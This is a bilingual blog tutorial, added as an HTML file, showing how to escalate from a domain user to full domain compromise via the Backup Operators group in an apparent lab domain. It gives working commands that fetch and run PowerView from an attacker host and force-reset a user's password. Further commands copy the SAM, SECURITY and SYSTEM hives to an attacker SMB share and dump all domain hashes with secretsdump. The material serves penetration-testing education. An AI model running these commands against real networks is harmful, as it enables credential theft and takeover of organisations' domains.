@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Backup Operators Group To Domain Admin | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Backup Operators Group To Domain Admin</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-12-20</span>
+</div>
+<h1 class="post-title">Backup Operators Group To Domain Admin</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<h3>What is the Backup Operators Group?</h3>
+<p>This group is automatically created when an Active Directory environment is installed, and it contains features that are useful for an attacker in reaching the Domain Controller. The key capability of this group is that it allows its members to back up any file regardless of that file's permissions -- whether the file is readable or not. The three files we are interested in are: SAM, SECURITY, and SYSTEM.</p>
+<p>In this article, we will follow a specific scenario rather than just executing the technique and ending the article.</p>
+<h2>Walkthrough</h2>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/1.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Initial Access</h3>
+<p>First, we have obtained a reverse shell session on the user <code>jehad</code>.</p>
+<p>Now let us check what ACLs or capabilities the user <code>jehad</code> has.</p>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/10.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 2: Load PowerView</h3>
+<p>We will load the PowerView tool into memory using the following command:</p>
+<pre><code class="language-powershell">iex(iwr http://192.168.100.112/powerview.ps1 -usebasicparsing)
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/2.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 3: Identify Backup Operators Group Members</h3>
+<p>Now we will run the following command to see which users are members of the Backup Operators group:</p>
+<pre><code class="language-powershell">Get-DomainGroupMember -identity &quot;Backup Operators&quot;
+</code></pre>
+<p>We can see that the user <code>muhammed</code> is a member of the Backup Operators group.</p>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/3.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 4: Enumerate ACLs for Privilege Paths</h3>
+<p>Now let us check whether the user <code>jehad</code> has any permissions over the user <code>muhammed</code>, such as the ability to change their password or something similar.</p>
+<p>We will run the following command to see the acquired privileges for each user:</p>
+<pre><code class="language-powershell">Find-InterestingDomainAcl
+</code></pre>
+<p>Looking at the results, we can see that the user <code>jehad</code> has Extended Right permissions over the user <code>muhammed</code>. This means we can change the password for the user <code>muhammed</code>.</p>
+<p>If you are not fully familiar with ACLs, refer to the article: Abusing Active Directory ACLs/ACEs.</p>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/4.png" alt="Step 5" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/5.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 5: Change the Target User's Password</h3>
+<p>Now we will execute the following commands to change the password for the user <code>muhammed</code>:</p>
+<pre><code class="language-powershell">$SecureString = ConvertTo-SecureString -String &quot;Tester12345#!!&quot; -AsPlainText -Force
+
+Set-DomainUserPassword -identity muhammed -AccountPassword $SecureString -domain vulnerable.com
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/6.png" alt="Step 7" loading="lazy"></figure>
+<h3>Step 6: Use BackupOperatorToDA to Extract Critical Files</h3>
+<p>Now that we have changed the password of the user <code>muhammed</code>, who is a member of the Backup Operators group, we will use the BackupOperatorToDA script.</p>
+<p>Before using the tool, open an SMB server because we will transfer the SAM, SECURITY, and SYSTEM files to it:</p>
+<pre><code class="language-bash">python /usr/share/doc/python3-impacket/examples/smbserver.py jehad . -smb2support
+</code></pre>
+<p>The tool's parameters are as follows:
+- <code>-t</code> -- the name of the Domain Controller machine
+- <code>-o</code> -- the path to the SMB server that was started previously
+- <code>-u</code> -- the username of the user in the Backup Operators group, which is <code>muhammed</code>
+- <code>-p</code> -- the password for the user <code>muhammed</code>
+- <code>-d</code> -- the domain name, which is <code>vulnerable.com</code></p>
+<p>So the final command will be:</p>
+<pre><code>.\BackUp.exe -t \\dc.vulnerable.com -o \\192.168.100.112\jehad\ -u muhammed -p Tester12345#!! -d vulnerable.com
+</code></pre>
+<p>The three critical files have now been transferred to our SMB share.</p>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/7.png" alt="Step 8" loading="lazy"></figure>
+<h3>Step 7: Extract NTLM Hashes from the Backup Files</h3>
+<p>These files will help us extract the NTLMv1 hash of the Domain Controller. We use the secretsdump tool with the following command:</p>
+<pre><code class="language-bash">/usr/bin/impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY
+</code></pre>
+<p>The NTLM hash of the Domain Controller has now been extracted.</p>
+
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/8.png" alt="Step 9" loading="lazy"></figure>
+<h3>Step 8: Dump All Domain User Hashes</h3>
+<p>Now we will pass the NT hash to the secretsdump tool along with the Domain Controller name so it extracts all users in the Active Directory environment along with their hashes from the NTDS file:</p>
+<pre><code class="language-bash">/usr/bin/impacket-secretsdump VULNERABLE.COM/'dc$'@dc.vulnerable.com -hashes ':1836d9e3263fb4973cff3bed243849be'
+</code></pre>
+<p>This completes the full domain compromise, starting from a user with Extended Right over a Backup Operators member, all the way to extracting every user's NTLM hash in the domain.</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/9.png" alt="Step 10" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>مقدمة:</p>
+<p>ماهو قروب الـBackup Operator؟ طبعا في البداية هذا القروب يتم انشاءة تلقائيا عند تنصيب بيئة الـActive Directory ويحتوي على ميزات تفيد المخترق في الوصول الى الـDomain Controller</p>
+<p>الميزات اللي يحتويها هذا القروب هو انه يسمح له انه يسوي Backup الى اي ملف بغض النظر عن صلاحية الملف سواء كان قابل للقراءة او لا ف نحن تهمنا ثلاث ملفات واللي هي SAM ,SECURITY,SYSTEM</p>
+<p>طبعا في هذي المقالة راح نتبع سيناريو معين ماراح فقط انفذ لكم التكنيك وننهي المقالة</p>
+<p>الشرح:</p>
+<p>اولا انا ماخذ جلسة Reverse Shell على المستخدم jehad</p>
+<p>الان خلونا نشوف ايش الـACLS او الامكانيات اللي المستخدم jehad يقوم فيها</p>
+<p>طبعا كل شي راح نسوي Load لي اداة powerview في الميموري عن طريق هذا الامر:</p>
+<p>iex(iwr http://192.168.100.112/powerview.ps1 -usebasicparsing)</p>
+<p>الان راح ننفذ هذا الامر عشان نشوف من هم المستخدمين المتواجدين في قروب الـ Backup Operators</p>
+<p>Get-DomainGroupMember -identity "Backup Operators"</p>
+<p>نلاحظ مع بعض ان المستخدم muhammed موجود ضمن قروب Backup Operator</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/1.png" alt="Step 1" loading="lazy"></figure>
+
+<p>الان خلونا نحاول نشوف هل المستخدم jehad عنده صلاحية على المستخدم muhammed مثلا انه يمكنه تغيير الباسورد او غيره</p>
+<p>راح ننفذ هذا الامر عشان نشوف الصلاحيات المكتسبة لكل مستخدم:</p>
+<p>Find-InterestingDomainAcl</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/10.png" alt="Step 2" loading="lazy"></figure>
+
+<p>نلاحظ مع بعض في الصورة السابقة انه المستخدم jehad عنده صلاحيات Extended Right على المستخدم muhammed ف هذا يعني انه ممكن نقوم بتغيير الباسورد الخاص في المستخدم muhammed</p>
+<p>لو انت مو فاهم الـACLS زين عليك بالمقالة هذي Abusing Active Directory ACLs/ACEs</p>
+<p>الان راح ننفذ هذا الامر عشان نغير الباسورد الخاص في المستخدم muhammed:</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/2.png" alt="Step 3" loading="lazy"></figure>
+
+<p>$SecureString = ConvertTo-SecureString -String "Tester12345#!!" -AsPlainText -Force</p>
+<p>Set-DomainUserPassword -identity muhammed -AccountPassword $SecureString -domain vulnerable.com</p>
+<p>الان بعد تغيير الباسورد الخاص في المستخدم muhammed اللي هو ضمن قروب الـBackup Operators راح نستخدم هذا السكربت BackupOperatorToDA</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/3.png" alt="Step 4" loading="lazy"></figure>
+
+<p>قبل استخدام الاداة افتح لك smb server عشان راح ننقل عليه ملفات الـSAM و الـSECURITY و الـSYSTEM</p>
+<p>امر فتح smb server:</p>
+<p>python /usr/share/doc/python3-impacket/examples/smbserver.py jehad . -smb2support</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/4.png" alt="Step 5" loading="lazy"></figure>
+
+<p>متطلبات الاداة موضحة في الصورة السابقة</p>
+<p>t- اسم جهاز الـDomain Controller</p>
+<p>o- الباث الخاص في الـsmb server اللي تم تشغيله مسبقا</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/5.png" alt="Step 6" loading="lazy"></figure>
+
+<p>u- اسم المستخدم اللي متواجد في قروب الـBackup Operators واللي هو muhammed</p>
+<p>p- الباسورد الخاص في المستخدم muhammed</p>
+<p>d- اسم النطاق واللي هو vulnerable.com</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/6.png" alt="Step 7" loading="lazy"></figure>
+
+<p>ف الامر النهائي راح يكون كذا:</p>
+<p>.\BackUp.exe -t \\dc.vulnerable.com -o \\192.168.100.112\jehad\ -u muhammed -p Tester12345#!! -d vulnerable.com</p>
+<p>الان تم نقل الثلاث الملفات المهمة واللي راح تفيدنا في استخراج NTLMv1 الخاص في الـDomain Controller</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/7.png" alt="Step 8" loading="lazy"></figure>
+
+<p>طبعا عشان نستخرجها الان راح نستخدم اداة secretdump عن طريق هذا الامر:</p>
+<p>/usr/bin/impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY</p>
+<p>الان تم استخراج NTLM هاش الخاص بالـDomain Controller</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/8.png" alt="Step 9" loading="lazy"></figure>
+
+<p>الان راح نعطي NT هاش لي اداة secretsdump مع اسم الـDomain Controller عشان تستخرج لنا جميع المستخدمين المتواجدين في بيئة الـActive Directory مع الهاش الخاص فيهم عن طريق ملف NTds</p>
+<p>الامر:</p>
+<p>/usr/bin/impacket-secretsdump VULNERABLE.COM/'dc$'@dc.vulnerable.com -hashes ':1836d9e3263fb4973cff3bed243849be'</p>
+<figure class="article-img"><img src="../assets/images/backup-operator-group-to-domain-admin/9.png" alt="Step 10" loading="lazy"></figure>
+
+<p>وصلنا لنهاية المقالة</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
